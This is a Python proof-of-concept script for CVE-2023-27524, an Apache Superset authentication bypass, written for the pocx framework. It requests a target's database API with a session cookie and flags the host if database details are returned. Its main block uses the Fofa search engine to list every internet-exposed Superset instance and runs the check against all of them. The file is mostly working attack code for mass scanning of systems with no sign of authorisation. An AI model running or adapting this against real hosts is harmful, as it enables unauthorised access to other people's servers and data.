from loguru import logger
from pocx import AioPoc
from pocx.funcs import Fofa, Ceye
from funcs.ua_pool import ua
from random import choice


class CVE_2023_27524(AioPoc):
    def __init__(self):
        super(CVE_2023_27524, self).__init__()
        self.name = 'Apache Superset Auth Bypass Vulnerability CVE-2023-27524.'
        self.cve = 'CVE-2023-27524'

    async def poc(self, target: str):
        target = target.rstrip('/').strip()

        pre_url = f'{target}/login/'
        url = f'{target}/api/v1/database/1'
        host = target.split('//')[1].split(':')[0]

        headers = {'User-Agent': choice(ua), 'Host': host}
        self.set_headers(headers)

        try:
            pre_resp = await self.aio_get(pre_url)
            cook = pre_resp.headers.get('Set-Cookie').split(';')[0]
            self.set_headers({'Cookie': cook, 'User-Agent': choice(ua), 'Host': host})
            resp = await self.aio_get(url)
            if resp.status_code == 200 and '"database_name":' in resp.text:
                logger.success(f'[+] {target} is vulnerable')
                return True
        except Exception:
            logger.error(f'[-] {target} is not vulnerable')
            pass
        return False


if __name__ == '__main__':
    grammar = 'body="Apache Superset"'
    poc = CVE_2023_27524()

    fofa = Fofa()
    fofa.set_config(api_key='xxxxxx', api_email='xxxxxx')
    print(f'[+] the asset account of grammar: {grammar} are: {fofa.asset_counts(grammar)}')
    pages = fofa.asset_pages(grammar)
    for page in range(1, pages + 1):
        print(f'[*] page {page}')
        assets = fofa.assets(grammar, page)
        poc.run(assets)
